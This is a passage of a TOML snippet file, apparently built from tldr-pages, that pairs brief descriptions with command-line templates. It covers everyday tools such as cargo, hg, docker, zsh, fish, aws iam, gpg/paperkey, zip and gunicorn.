  description = "Simulate all firewall rules"
  command = "pve-firewall simulate"
  output = ""

[[snippets]]
  description = "Show the status of Proxmox VE Firewall"
  command = "pve-firewall status"
  output = ""

[[snippets]]
  description = "Remove the entire `target` directory"
  command = "cargo clean"
  output = ""

[[snippets]]
  description = "Remove documentation artifacts (the `target/doc` directory)"
  command = "cargo clean --doc"
  output = ""

[[snippets]]
  description = "Remove release artifacts (the `target/release` directory)"
  command = "cargo clean --release"
  output = ""

[[snippets]]
  description = "Remove artifacts in the directory of the given profile (in this case, `target/debug`)"
  command = "cargo clean --profile <dev>"
  output = ""

[[snippets]]
  description = "Search for a package name and descriptions of all locally installed packages from a specific regular expression"
  command = "tlmgr search ""<regular_expression>"""
  output = ""

[[snippets]]
  description = "Search for all file names of all locally installed packages from a regular expression"
  command = "tlmgr search --file ""<regular_expression>"""
  output = ""

[[snippets]]
  description = "Search for all file names, package names, and descriptions of all locally installed packages from a regular expression"
  command = "tlmgr search --all ""<regular_expression>"""
  output = ""

[[snippets]]
  description = "Search the TeX Live database, instead of the local installation"
  command = "tlmgr search --global ""<regular_expression>"""
  output = ""

[[snippets]]
  description = "Restrict the matches for package names and descriptions (but not for file names) to whole words"
  command = "tlmgr search --all --word ""<regular_expression>"""
  output = ""

[[snippets]]
  description = "Push changes to the "default" remote path"
  command = "hg push"
  output = ""

[[snippets]]
  description = "Push changes to a specified remote repository"
  command = "hg push <path/to/destination_repository>"
  output = ""

[[snippets]]
  description = "Push a new branch if it does not exist (disabled by default)"
  command = "hg push --new-branch"
  output = ""

[[snippets]]
  description = "Specify a specific revision changeset to push"
  command = "hg push --rev <revision>"
  output = ""

[[snippets]]
  description = "Specify a specific branch to push"
  command = "hg push --branch <branch>"
  output = ""

[[snippets]]
  description = "Specify a specific bookmark to push"
  command = "hg push --bookmark <bookmark>"
  output = ""

[[snippets]]
  description = "List all routes"
  command = "rails routes"
  output = ""

[[snippets]]
  description = "List all routes in an expanded format"
  command = "rails routes --expanded"
  output = ""

[[snippets]]
  description = "List routes partially matching URL helper method name, HTTP verb, or URL path"
  command = "rails routes -g <posts_path|GET|/posts>"
  output = ""

[[snippets]]
  description = "List routes that map to a specified controller"
  command = "rails routes -c <posts|Posts|Blogs::PostsController>"
  output = ""

[[snippets]]
  description = "List the name, UUID, state, persistence type, autostart status, capacity, space allocated, and space available for the storage pool specified by name or UUID (determine using `virsh pool-list`)"
  command = "virsh pool-info --pool <name|uuid>"
  output = ""

[[snippets]]
  description = "Start an interactive session"
  command = "swipl"
  output = ""

[[snippets]]
  description = "Execute a command without showing any output"
  command = "swipl --quiet -t ""<command>"""
  output = ""

[[snippets]]
  description = "Execute a script"
  command = "swipl <path/to/file.pl>"
  output = ""

[[snippets]]
  description = "Print all shell configuration variables"
  command = "swipl --dump-runtime-variables"
  output = ""

[[snippets]]
  description = "Display version"
  command = "swipl --version"
  output = ""

[[snippets]]
  description = "Search the `gcloud` CLI reference documents for specific terms"
  command = "gcloud help"
  output = ""

[[snippets]]
  description = "View supplementary help material for non-command topics like accessibility, filtering, and formatting"
  command = "gcloud topic <topic_name>"
  output = ""

[[snippets]]
  description = "List all available topics"
  command = "gcloud topic --help"
  output = ""

[[snippets]]
  description = "Create a new Laravel application"
  command = "lambo new <app_name>"
  output = ""

[[snippets]]
  description = "Open the configuration in your default editor"
  command = "lambo edit-config"
  output = ""

[[snippets]]
  description = "Open the configuration in a specific editor"
  command = "lambo edit-config --editor=""<path/to/editor>"""
  output = ""

[[snippets]]
  description = "Open the configuration file that is run after new applications have been scaffolded"
  command = "lambo edit-after"
  output = ""

[[snippets]]
  description = "Print the source and destination IP addresses of all packets in a pcap file"
  command = "ipsumdump --src --dst <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Print the timestamps, source address, source port, destination address, destination port and protocol of all packets read from a given network interface"
  command = "ipsumdump --interface <eth0> -tsSdDp"
  output = ""

[[snippets]]
  description = "Print the anonymised source address, anonymised destination address, and IP packet length of all packets in a pcap file"
  command = "ipsumdump --src --dst --length --anonymize <path/to/file.pcap>"
  output = ""

[[snippets]]
  description = "Exchange the first color in each `oldcolor` - `newcolor` pair with the second color"
  command = "ppmchange <oldcolor1 newcolor1 oldcolor2 newcolor2 ...> <path/to/input.ppm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Specify how similar colors must be in order to be considered the same"
  command = "ppmchange -closeness <percentage> <oldcolor1 newcolor1 oldcolor2 newcolor2 ...> <path/to/input.ppm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Replace all pixels not specified in the arguments by a color"
  command = "ppmchange -remainder <color> <oldcolor1 newcolor1 oldcolor2 newcolor2 ...> <path/to/input.ppm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker rmi"
  output = ""

[[snippets]]
  description = "Remove one or more images given their names"
  command = "docker rmi <image1 image2 ...>"
  output = ""

[[snippets]]
  description = "Force remove an image"
  command = "docker rmi --force <image>"
  output = ""

[[snippets]]
  description = "Remove an image without deleting untagged parents"
  command = "docker rmi --no-prune <image>"
  output = ""

[[snippets]]
  description = "Flush all pending write operations on all disks"
  command = "sync"
  output = ""

[[snippets]]
  description = "Flush all pending write operations on a single file to disk"
  command = "sync <path/to/file>"
  output = ""

[[snippets]]
  description = "Rename a container"
  command = "docker rename <container> <new_name>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "docker rename --help"
  output = ""

[[snippets]]
  description = "Open qutebrowser with a specified storage directory"
  command = "qutebrowser --basedir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a qutebrowser instance with temporary settings"
  command = "qutebrowser --set <content.geolocation> <true|false>"
  output = ""

[[snippets]]
  description = "Restore a named session of a qutebrowser instance"
  command = "qutebrowser --restore <session_name>"
  output = ""

[[snippets]]
  description = "Launch qutebrowser, opening all URLs using the specified method"
  command = "qutebrowser --target <auto|tab|tab-bg|tab-silent|tab-bg-silent|window|private-window>"
  output = ""

[[snippets]]
  description = "Open qutebrowser with a temporary base directory and print logs to `stdout` as JSON"
  command = "qutebrowser --temp-basedir --json-logging"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "fish"
  output = ""

[[snippets]]
  description = "Start an interactive shell session without loading startup configs"
  command = "fish --no-config"
  output = ""

[[snippets]]
  description = "Execute specific commands"
  command = "fish --command ""<echo 'fish is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "fish <path/to/script.fish>"
  output = ""

[[snippets]]
  description = "Check a specific script for syntax errors"
  command = "fish --no-execute <path/to/script.fish>"
  output = ""

[[snippets]]
  description = "Execute specific commands from `stdin`"
  command = "<echo ""echo 'fish is executed'""> | fish"
  output = ""

[[snippets]]
  description = "Start an interactive shell session in private mode, where the shell does not access old history or save new history"
  command = "fish --private"
  output = ""

[[snippets]]
  description = "Define and export an environmental variable that persists across shell restarts (builtin)"
  command = "set --universal --export <variable_name> <variable_value>"
  output = ""

[[snippets]]
  description = "Convert an input image to PPM format"
  command = "imgtoppm <path/to/input> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "imgtoppm -version"
  output = ""

[[snippets]]
  description = "Format the output of a command for a 30 characters wide display"
  command = "printf ""header1 header2\nbar foo\n"" | column --output-width <30>"
  output = ""

[[snippets]]
  description = "Split columns automatically and auto-align them in a tabular format"
  command = "printf ""header1 header2\nbar foo\n"" | column --table"
  output = ""

[[snippets]]
  description = "Specify the column delimiter character for the `--table` option (e.g. "," for CSV) (defaults to whitespace)"
  command = "printf ""header1,header2\nbar,foo\n"" | column --table --separator <,>"
  output = ""

[[snippets]]
  description = "Fill rows before filling columns"
  command = "printf ""header1\nbar\nfoobar\n"" | column --output-width <30> --fillrows"
  output = ""

[[snippets]]
  description = "Deploy Cradle to a server"
  command = "cradle deploy production"
  output = ""

[[snippets]]
  description = "Deploy static assets to Amazon S3"
  command = "cradle deploy s3"
  output = ""

[[snippets]]
  description = "Deploy static assets including the Yarn "components" directory"
  command = "cradle deploy s3 --include-yarn"
  output = ""

[[snippets]]
  description = "Deploy static assets including the "upload" directory"
  command = "cradle deploy s3 --include-upload"
  output = ""

[[snippets]]
  description = "Blend the specified PPM images using fadefactor to control the weight of each image"
  command = "ppmmix <fadefactor> <path/to/input_file1.ppm> <path/to/input_file2.ppm> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "zsh"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "zsh -c ""<echo Hello world>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "zsh <path/to/script.zsh>"
  output = ""

[[snippets]]
  description = "Check a specific script for syntax errors without executing it"
  command = "zsh --no-exec <path/to/script.zsh>"
  output = ""

[[snippets]]
  description = "Execute specific commands from `stdin`"
  command = "<echo Hello world> | zsh"
  output = ""

[[snippets]]
  description = "Execute a specific script, printing each command in the script before executing it"
  command = "zsh --xtrace <path/to/script.zsh>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session in verbose mode, printing each command before executing it"
  command = "zsh --verbose"
  output = ""

[[snippets]]
  description = "Execute a specific command inside `zsh` with disabled glob patterns"
  command = "noglob <command>"
  output = ""

[[snippets]]
  description = "Run in terminal"
  command = "glances"
  output = ""

[[snippets]]
  description = "Run in web server mode to show results in browser"
  command = "glances -w"
  output = ""

[[snippets]]
  description = "Run in server mode to allow connections from other Glances clients"
  command = "glances -s"
  output = ""

[[snippets]]
  description = "Connect to a Glances server"
  command = "glances -c <hostname>"
  output = ""

[[snippets]]
  description = "Require a password in (web) server mode"
  command = "glances -s --password"
  output = ""

[[snippets]]
  description = "Merge a source branch into a specific destination branch"
  command = "git merge-into <source_branch> <destination_branch>"
  output = ""

[[snippets]]
  description = "Merge current branch into a specific destination branch"
  command = "git merge-into <destination_branch>"
  output = ""

[[snippets]]
  description = "Monitor all occurring X events"
  command = "xev"
  output = ""

[[snippets]]
  description = "Monitor all X events of the root window instead of creating a new one"
  command = "xev -root"
  output = ""

[[snippets]]
  description = "Monitor all X events of a particular window"
  command = "xev -id <window_id>"
  output = ""

[[snippets]]
  description = "Monitor X events from a given category (can be specified multiple times)"
  command = "xev -event <event_category>"
  output = ""

[[snippets]]
  description = "Display each file in the repository, showing commits and active days"
  command = "git effort"
  output = ""

[[snippets]]
  description = "Display files modified by a specific number of commits or more, showing commits and active days"
  command = "git effort --above <5>"
  output = ""

[[snippets]]
  description = "Display files modified by a specific author, showing commits and active days"
  command = "git effort -- --author=""<username>"""
  output = ""

[[snippets]]
  description = "Display files modified since a specific time/date, showing commits and active days"
  command = "git effort -- --since=""<last month>"""
  output = ""

[[snippets]]
  description = "Display only the specified files or directories, showing commits and active days"
  command = "git effort <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Display all files in a specific directory, showing commits and active days"
  command = "git effort <path/to/directory/*>"
  output = ""

[[snippets]]
  description = "Show why an npm package is installed"
  command = "npm-why <package>"
  output = ""

[[snippets]]
  description = "Convert an ILBM file to a PPM image"
  command = "ilbmtoppm <path/to/file.ilbm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Use the specified color to "show through" where the image is transparent"
  command = "ilbmtoppm -transparent <color> <path/to/file.ilbm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Ignore the chunk with the specified chunk ID"
  command = "ilbmtoppm -ignore <chunkID> <path/to/file.ilbm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Store the input's transparency information to the specified PBM file"
  command = "ilbmtoppm -maskfile <path/to/maskfile.pbm> <path/to/file.ilbm> > <path/to/file.ppm>"
  output = ""

[[snippets]]
  description = "Randomize the order of lines in a file and output the result"
  command = "shuf <path/to/file>"
  output = ""

[[snippets]]
  description = "Only output the first 5 entries of the result"
  command = "shuf --head-count=<5> <path/to/file>"
  output = ""

[[snippets]]
  description = "Write the output to another file"
  command = "shuf <path/to/input> --output=<path/to/output>"
  output = ""

[[snippets]]
  description = "Generate 3 random numbers in the range 1-10 (inclusive)"
  command = "shuf --head-count=<3> --input-range=<1-10> --repeat"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr rc"
  output = ""

[[snippets]]
  description = "Open a new terminal"
  command = "kitty"
  output = ""

[[snippets]]
  description = "Open a terminal with the specified title for the window"
  command = "kitty --title ""<title>"""
  output = ""

[[snippets]]
  description = "Start the theme-chooser builtin"
  command = "kitty +kitten themes"
  output = ""

[[snippets]]
  description = "Display an image in the terminal"
  command = "kitty +kitten icat <path/to/image>"
  output = ""

[[snippets]]
  description = "Copy the contents of `stdin` to the clipboard"
  command = "echo <example> | kitty +kitten clipboard"
  output = ""

[[snippets]]
  description = "List all VirtualBox virtual machines"
  command = "VBoxManage list vms"
  output = ""

[[snippets]]
  description = "Show DHCP servers available on the host system"
  command = "VBoxManage list dhcpservers"
  output = ""

[[snippets]]
  description = "Show Oracle VM VirtualBox extension packs currently installed"
  command = "VBoxManage list extpacks"
  output = ""

[[snippets]]
  description = "Show all virtual machine groups"
  command = "VBoxManage list groups"
  output = ""

[[snippets]]
  description = "Show virtual disk settings that are currently in use by VirtualBox"
  command = "VBoxManage list hdds"
  output = ""

[[snippets]]
  description = "Show host-only network interfaces available on host system"
  command = "VBoxManage list hostonlyifs"
  output = ""

[[snippets]]
  description = "Show the list of currently running virtual machines"
  command = "VBoxManage list runningvms"
  output = ""

[[snippets]]
  description = "Show host system information"
  command = "VBoxManage list hostinfo"
  output = ""

[[snippets]]
  description = "Show where CUPS is currently installed"
  command = "cups-config --serverbin"
  output = ""

[[snippets]]
  description = "Show the location of CUPS' configuration directory"
  command = "cups-config --serverroot"
  output = ""

[[snippets]]
  description = "Show the location of CUPS' data directory"
  command = "cups-config --datadir"
  output = ""

[[snippets]]
  description = "Display help"
  command = "cups-config --help"
  output = ""

[[snippets]]
  description = "Display CUPS version"
  command = "cups-config --version"
  output = ""

[[snippets]]
  description = "Take a specific secret key and generate a text file with the secret data"
  command = "paperkey --secret-key <path/to/secret_key.gpg> --output <path/to/secret_data.txt>"
  output = ""

[[snippets]]
  description = "Take the secret key data in `secret_data.txt` and combine it with the public key to reconstruct the secret key"
  command = "paperkey --pubring <path/to/public_key.gpg> --secrets <path/to/secret_data.txt> --output <secret_key.gpg>"
  output = ""

[[snippets]]
  description = "Export a specific secret key and generate a text file with the secret data"
  command = "gpg --export-secret-key <key> | paperkey --output <path/to/secret_data.txt>"
  output = ""

[[snippets]]
  description = "Pass options to `rustdoc`"
  command = "cargo rustdoc -- <rustdoc_options>"
  output = ""

[[snippets]]
  description = "Warn about a documentation lint"
  command = "cargo rustdoc -- --warn rustdoc::<lint_name>"
  output = ""

[[snippets]]
  description = "Ignore a documentation lint"
  command = "cargo rustdoc -- --allow rustdoc::<lint_name>"
  output = ""

[[snippets]]
  description = "Document the package's library"
  command = "cargo rustdoc --lib"
  output = ""

[[snippets]]
  description = "Document the specified binary"
  command = "cargo rustdoc --bin <name>"
  output = ""

[[snippets]]
  description = "Document the specified example"
  command = "cargo rustdoc --example <name>"
  output = ""

[[snippets]]
  description = "Document the specified integration test"
  command = "cargo rustdoc --test <name>"
  output = ""

[[snippets]]
  description = "Run the web extension in the current directory in Firefox"
  command = "web-ext run"
  output = ""

[[snippets]]
  description = "Run a web extension from a specific directory in Firefox"
  command = "web-ext run --source-dir <path/to/directory>"
  output = ""

[[snippets]]
  description = "Display verbose execution output"
  command = "web-ext run --verbose"
  output = ""

[[snippets]]
  description = "Run a web extension in Firefox Android"
  command = "web-ext run --target firefox-android"
  output = ""

[[snippets]]
  description = "Lint the manifest and source files for errors"
  command = "web-ext lint"
  output = ""

[[snippets]]
  description = "Build and package the extension"
  command = "web-ext build"
  output = ""

[[snippets]]
  description = "Display verbose build output"
  command = "web-ext build --verbose"
  output = ""

[[snippets]]
  description = "Sign a package for self-hosting"
  command = "web-ext sign --api-key <api_key> --api-secret <api_secret>"
  output = ""

[[snippets]]
  description = "List the namespaces"
  command = "kubens"
  output = ""

[[snippets]]
  description = "Change the active namespace"
  command = "kubens <name>"
  output = ""

[[snippets]]
  description = "Switch to the previous namespace"
  command = "kubens -"
  output = ""

[[snippets]]
  description = "List users"
  command = "aws iam list-users"
  output = ""

[[snippets]]
  description = "List policies"
  command = "aws iam list-policies"
  output = ""

[[snippets]]
  description = "List groups"
  command = "aws iam list-groups"
  output = ""

[[snippets]]
  description = "Get users in a group"
  command = "aws iam get-group --group-name <group_name>"
  output = ""

[[snippets]]
  description = "Describe an IAM policy"
  command = "aws iam get-policy --policy-arn arn:aws:iam::aws:policy/<policy_name>"
  output = ""

[[snippets]]
  description = "List access keys"
  command = "aws iam list-access-keys"
  output = ""

[[snippets]]
  description = "List access keys for a specific user"
  command = "aws iam list-access-keys --user-name <user_name>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws iam help"
  output = ""

[[snippets]]
  description = "Display the subcommand help"
  command = "glab alias"
  output = ""

[[snippets]]
  description = "List all the aliases `glab` is configured to use"
  command = "glab alias list"
  output = ""

[[snippets]]
  description = "Create a `glab` subcommand alias"
  command = "glab alias set <mrv> '<mr view>'"
  output = ""

[[snippets]]
  description = "Set a shell command as a `glab` subcommand"
  command = "glab alias set --shell <alias_name> <command>"
  output = ""

[[snippets]]
  description = "Delete a command shortcut"
  command = "glab alias delete <alias_name>"
  output = ""

[[snippets]]
  description = "Package an application for the current architecture and platform"
  command = "electron-packager ""<path/to/app>"" ""<app_name>"""
  output = ""

[[snippets]]
  description = "Package an application for all architectures and platforms"
  command = "electron-packager ""<path/to/app>"" ""<app_name>"" --all"
  output = ""

[[snippets]]
  description = "Package an application for 64-bit Linux"
  command = "electron-packager ""<path/to/app>"" ""<app_name>"" --platform=""<linux>"" --arch=""<x64>"""
  output = ""

[[snippets]]
  description = "Package an application for ARM macOS"
  command = "electron-packager ""<path/to/app>"" ""<app_name>"" --platform=""<darwin>"" --arch=""<arm64>"""
  output = ""

[[snippets]]
  description = "Initialize a new React Native project in a directory of the same name"
  command = "react-native init <project_name>"
  output = ""

[[snippets]]
  description = "Start the metro bundler"
  command = "react-native start"
  output = ""

[[snippets]]
  description = "Start the metro bundler with a clean cache"
  command = "react-native start --reset-cache"
  output = ""

[[snippets]]
  description = "Build the current application and start it on a connected Android device or emulator"
  command = "react-native run-android"
  output = ""

[[snippets]]
  description = "Build the current application and start it on an iOS simulator"
  command = "react-native run-ios"
  output = ""

[[snippets]]
  description = "Build the current application in `release` mode and start it on a connected Android device or emulator"
  command = "react-native run-android --variant=<release>"
  output = ""

[[snippets]]
  description = "Start `logkitty` and print logs to `stdout`"
  command = "react-native log-android"
  output = ""

[[snippets]]
  description = "Start `tail system.log` for an iOS simulator and print logs to `stdout`"
  command = "react-native log-ios"
  output = ""

[[snippets]]
  description = "Add a Java version to jEnv"
  command = "jenv add <path/to/jdk_home>"
  output = ""

[[snippets]]
  description = "Display the current JDK version used"
  command = "jenv version"
  output = ""

[[snippets]]
  description = "Display all managed JDKs"
  command = "jenv versions"
  output = ""

[[snippets]]
  description = "Set the global JDK version"
  command = "jenv global <java_version>"
  output = ""

[[snippets]]
  description = "Set the JDK version for the current shell session"
  command = "jenv shell <java_version>"
  output = ""

[[snippets]]
  description = "Enable a jEnv plugin"
  command = "jenv enable-plugin <plugin_name>"
  output = ""

[[snippets]]
  description = "Calculate the SHA384 checksum for one or more files"
  command = "sha384sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of SHA384 checksums to a file"
  command = "sha384sum <path/to/file1 path/to/file2 ...> > <path/to/file.sha384>"
  output = ""

[[snippets]]
  description = "Calculate a SHA384 checksum from `stdin`"
  command = "<command> | sha384sum"
  output = ""

[[snippets]]
  description = "Read a file of SHA384 sums and filenames and verify all files have matching checksums"
  command = "sha384sum --check <path/to/file.sha384>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "sha384sum --check --quiet <path/to/file.sha384>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "sha384sum --ignore-missing --check --quiet <path/to/file.sha384>"
  output = ""

[[snippets]]
  description = "List local Docker images"
  command = "podman image ls"
  output = ""

[[snippets]]
  description = "Delete unused local Docker images"
  command = "podman image prune"
  output = ""

[[snippets]]
  description = "Delete all unused images (not just those without a tag)"
  command = "podman image prune --all"
  output = ""

[[snippets]]
  description = "Show the history of a local Docker image"
  command = "podman image history <image>"
  output = ""

[[snippets]]
  description = "Fetch the newest version of Homebrew and all formulae"
  command = "brew update"
  output = ""

[[snippets]]
  description = "Print the contents of the file and display a progress bar"
  command = "pv <path/to/file>"
  output = ""

[[snippets]]
  description = "Measure the speed and amount of data flow between pipes (`--size` is optional)"
  command = "command1 | pv --size <expected_amount_of_data_for_eta> | command2"
  output = ""

[[snippets]]
  description = "Filter a file, see both progress and amount of output data"
  command = "pv -cN in <big_text_file> | grep <pattern> | pv -cN out > <filtered_file>"
  output = ""

[[snippets]]
  description = "Attach to an already running process and see its file reading progress"
  command = "pv -d <PID>"
  output = ""

[[snippets]]
  description = "Read an erroneous file, skip errors as `dd conv=sync,noerror` would"
  command = "pv -EE <path/to/faulty_media> > image.img"
  output = ""

[[snippets]]
  description = "Stop reading after reading specified amount of data, rate limit to 1K/s"
  command = "pv -L 1K --stop-at --size <maximum_file_size_to_be_read>"
  output = ""

[[snippets]]
  description = "Run Python web app"
  command = "gunicorn <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Listen on port 8080 on localhost"
  command = "gunicorn --bind <localhost>:<8080> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Turn on live reload"
  command = "gunicorn --reload <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Use 4 worker processes for handling requests"
  command = "gunicorn --workers <4> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Use 4 worker threads for handling requests"
  command = "gunicorn --threads <4> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Run app over HTTPS"
  command = "gunicorn --certfile <cert.pem> --keyfile <key.pem> <import.path:app_object>"
  output = ""

[[snippets]]
  description = "Add files/directories to a specific archive ([r]ecursively)"
  command = "zip -r <path/to/compressed.zip> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Remove files/directories from a specific archive ([d]elete)"
  command = "zip -d <path/to/compressed.zip> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Archive files/directories e[x]cluding specified ones"
  command = "zip -r <path/to/compressed.zip> <path/to/file_or_directory1 path/to/file_or_directory2 ...> -x <path/to/excluded_files_or_directories>"
  output = ""

[[snippets]]
  description = "Archive files/directories with a specific compression level (`0` - the lowest, `9` - the highest)"
  command = "zip -r -<0..9> <path/to/compressed.zip> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Create an [e]ncrypted archive with a specific password"
  command = "zip -r -e <path/to/compressed.zip> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Archive files/directories to a multi-part [s]plit `zip` archive (e.g. 3 GB parts)"
  command = "zip -r -s <3g> <path/to/compressed.zip> <path/to/file_or_directory1 path/to/file_or_directory2 ...>"
  output = ""

[[snippets]]
  description = "Print a specific archive contents"
  command = "zip -sf <path/to/compressed.zip>"
  output = ""

[[snippets]]
  description = "Run a WirePlumber script"
  command = "wpexec <path/to/file.lua>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "wpexec --help"
  output = ""

[[snippets]]
  description = "Connect to a music player daemon on a given host and port"
  command = "ncmpcpp --host <ip> --port <port>"
  output = ""

[[snippets]]
  description = "Display metadata of the current song to console"
  command = "ncmpcpp --current-song"
  output = ""

[[snippets]]
  description = "Use a specified configuration file"
  command = "ncmpcpp --config <file>"
  output = ""

[[snippets]]
  description = "Use a different set of key bindings from a file"
  command = "ncmpcpp --bindings <file>"
  output = ""

[[snippets]]
  description = "Display help about a specific Git subcommand"
  command = "git help <subcommand>"
  output = ""

[[snippets]]
  description = "Display help about a specific Git subcommand in a web browser"
  command = "git help --web <subcommand>"
  output = ""

[[snippets]]
  description = "Display a list of all available Git subcommands"
  command = "git help --all"
  output = ""

[[snippets]]
  description = "List the available guides"
  command = "git help --guide"
  output = ""

[[snippets]]
  description = "List all possible configuration variables"
  command = "git help --config"
  output = ""

[[snippets]]
  description = "Execute code style fixing in the current directory"
  command = "php-cs-fixer fix"
  output = ""

[[snippets]]
  description = "Execute code style fixing for a specific directory"
  command = "php-cs-fixer fix <path/to/directory>"
  output = ""

[[snippets]]
  description = "Execute code style linting without applying changes"
  command = "php-cs-fixer fix --dry-run"
  output = ""

[[snippets]]
  description = "Execute code style fixes using specific rules"
  command = "php-cs-fixer fix --rules=<rules>"
  output = ""

[[snippets]]
  description = "Display the rules that have been applied"
  command = "php-cs-fixer fix --verbose"
  output = ""

[[snippets]]
  description = "Output the results in a different format"
  command = "php-cs-fixer fix --format=<txt|json|xml|checkstyle|junit|gitlab>"
  output = ""

[[snippets]]
  description = "Display files that require fixing"
  command = "php-cs-fixer list-files"
  output = ""

[[snippets]]
  description = "Describe a rule or ruleset"
  command = "php-cs-fixer describe <rule>"
  output = ""

[[snippets]]
  description = "Rotate the input image counter-clockwise for a specific degree"
  command = "pamflip -rotate<90|180|270> <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Flip left for right"
  command = "pamflip -leftright <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Flip top for bottom"
  command = "pamflip -topbottom <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Flip the input image on the main diagonal"
  command = "pamflip -transpose <path/to/input.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Start the Deluge daemon"
  command = "deluged"
  output = ""

[[snippets]]
  description = "Start the Deluge daemon on a specific port"
  command = "deluged -p <port>"
  output = ""

[[snippets]]
  description = "Start the Deluge daemon using a specific configuration file"
  command = "deluged -c <path/to/configuration_file>"
  output = ""

[[snippets]]
  description = "Start the Deluge daemon and output the log to a file"
  command = "deluged -l <path/to/log_file>"
  output = ""

[[snippets]]
  description = "Start an HTTP server on the default port to upload files to the current directory"
  command = "http-server-upload"
  output = ""

[[snippets]]
  description = "Start an HTTP server with the specified maximum allowed file size for uploads in MiB (defaults to 200 MiB)"
  command = "MAX_FILE_SIZE=<size_in_megabytes> http-server-upload"
  output = ""

[[snippets]]
  description = "Start an HTTP server on a specific port to upload files to the current directory"
  command = "PORT=<port> http-server-upload"
  output = ""

[[snippets]]
  description = "Start an HTTP server, storing the uploaded files in a specific directory"
  command = "UPLOAD_DIR=<path/to/directory> http-server-upload"
  output = ""

[[snippets]]
  description = "Start an HTTP server using a specific directory to temporarily store files during the upload process"
  command = "UPLOAD_TMP_DIR=<path/to/directory> http-server-upload"
  output = ""

[[snippets]]
  description = "Start an HTTP server accepting uploads with a specific token field in the HTTP post"
  command = "TOKEN=<secret> http-server-upload"
  output = ""

[[snippets]]
  description = "Install Bicep CLI"
  command = "az bicep install"
  output = ""

[[snippets]]
  description = "Build a Bicep file"
  command = "az bicep build --file <path/to/file.bicep>"
  output = ""

[[snippets]]
  description = "Attempt to decompile an ARM template file to a Bicep file"
  command = "az bicep decompile --file <path/to/template_file.json>"
  output = ""

[[snippets]]
  description = "Upgrade Bicep CLI to the latest version"
  command = "az bicep upgrade"
  output = ""

[[snippets]]
  description = "Display the installed version of Bicep CLI"
  command = "az bicep version"
  output = ""

[[snippets]]
  description = "List all available versions of Bicep CLI"
  command = "az bicep list-versions"
  output = ""

[[snippets]]
  description = "Uninstall Bicep CLI"
  command = "az bicep uninstall"
  output = ""

[[snippets]]
  description = "Calculate a hash with a password and a salt with the default parameters"
  command = "echo ""<password>"" | argon2 ""<salt_text>"""
  output = ""

[[snippets]]
  description = "Calculate a hash with the specified algorithm"
  command = "echo ""<password>"" | argon2 ""<salt_text>"" -<d|i|id>"
  output = ""

[[snippets]]
  description = "Display the output hash without additional information"
  command = "echo ""<password>"" | argon2 ""<salt_text>"" -e"
  output = ""

[[snippets]]
  description = "Calculate a hash with given iteration [t]imes, [m]emory usage, and [p]arallelism parameters"
  command = "echo ""<password>"" | argon2 ""<salt_text>"" -t <5> -m <20> -p <7>"
  output = ""

[[snippets]]
  description = "Repeatedly run a command and show the result"
  command = "watch <command>"
  output = ""

[[snippets]]
  description = "Re-run a command every 60 seconds"
  command = "watch -n <60> <command>"
  output = ""

[[snippets]]
  description = "Monitor the contents of a directory, highlighting differences as they appear"
  command = "watch -d <ls -l>"
  output = ""

[[snippets]]
  description = "Repeatedly run a pipeline and show the result"
  command = "watch '<command_1> | <command_2> | <command_3>'"
  output = ""

[[snippets]]
  description = "Verify a signed file"
  command = "gpgv <path/to/file>"
  output = ""

[[snippets]]
  description = "Verify a signed file using a detached signature"
  command = "gpgv <path/to/signature> <path/to/file>"
  output = ""

[[snippets]]
  description = "Add a file to the list of keyrings (a single exported key also counts as a keyring)"
  command = "gpgv --keyring <./alice.keyring> <path/to/signature> <path/to/file>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr tldr-lint"
  output = ""

[[snippets]]
  description = "Print the file name of this terminal"
  command = "tty"
  output = ""

[[snippets]]
  description = "Run a jar file"
  command = "kotlin <filename.jar>"
  output = ""

[[snippets]]
  description = "Display Kotlin and JVM version"
  command = "kotlin -version"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xzgrep"
  output = ""

[[snippets]]
  description = "Format output for a PostScript printer, saving the output to a file"
  command = "groff <path/to/input.roff> > <path/to/output.ps>"
  output = ""

